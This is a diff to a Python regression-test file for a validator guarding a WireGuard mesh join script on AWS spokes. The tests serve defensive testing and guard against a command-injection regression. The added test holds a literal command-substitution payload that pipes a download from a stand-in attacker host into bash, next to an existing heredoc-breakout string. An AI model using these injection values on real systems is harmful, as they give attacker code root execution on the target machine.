@@ -18,6 +18,8 @@ JOIN = REPO_ROOT / "aws" / "scripts" / "wg-mesh-join.sh"
 
 VALID_KEY = "kOtkkR2VfEHFN0m3ES0BJ0BpKbXPQ8YvvKZ5RRSXSHQ="
 HEREDOC_BREAKOUT = VALID_KEY + "\nCONF\ntouch /tmp/spoke_pwned\ncat > /dev/null <<CONF"
+# The scan's own PoC shape: command substitution, no newline required.
+COMMAND_SUBSTITUTION = "AAAA$(curl${IFS}http://attacker.example/x|bash)BBBB="
 
 
 def accepts(value: str) -> bool:
@@ -27,12 +29,33 @@ def accepts(value: str) -> bool:
     ).returncode == 0
 
 
+def uncommented(lines):
+    """Source lines with comment-only lines dropped.
+
+    The wiring assertions must not be satisfied by a guard that has been
+    commented out — that would pass while the vulnerability is live again.
+    """
+    return "\n".join(l for l in lines if not l.lstrip().startswith("#"))
+
+
 class HubReplyToRootShellTest(unittest.TestCase):
     def test_rejects_the_heredoc_breakout(self):
         self.assertFalse(
             accepts(HEREDOC_BREAKOUT),
             "validator accepted a reply that closes the CONF heredoc: everything after "
             "it is executed as root on the AWS spoke via `base64 -d | bash`",
+        )
+
+    def test_rejects_the_command_substitution_payload(self):
+        """The scan's stated vector verbatim: $( ) inside the value, no newline needed.
+
+        The REMOTE heredoc is unquoted, so command substitution is expanded when the
+        box runs the decoded script as root.
+        """
+        self.assertFalse(
+            accepts(COMMAND_SUBSTITUTION),
+            "validator accepted the scan's command-substitution payload: it expands "
+            "inside the root-executed remote script on the AWS spoke",
         )
 
     def test_rejects_any_newline_bearing_reply(self):
@@ -52,7 +75,7 @@ class JoinScriptWiringTest(unittest.TestCase):
         except StopIteration:
             self.fail("could not locate the REMOTE heredoc interpolating HUB_PUB")
 
-        preceding = "\n".join(lines[:sink])
+        preceding = uncommented(lines[:sink])
         self.assertRegex(
             preceding, r"vh_require\s+vh_is_wg_key.*HUB_PUB",
             "HUB_PUB reaches the root-executed remote script without an allowlist check",
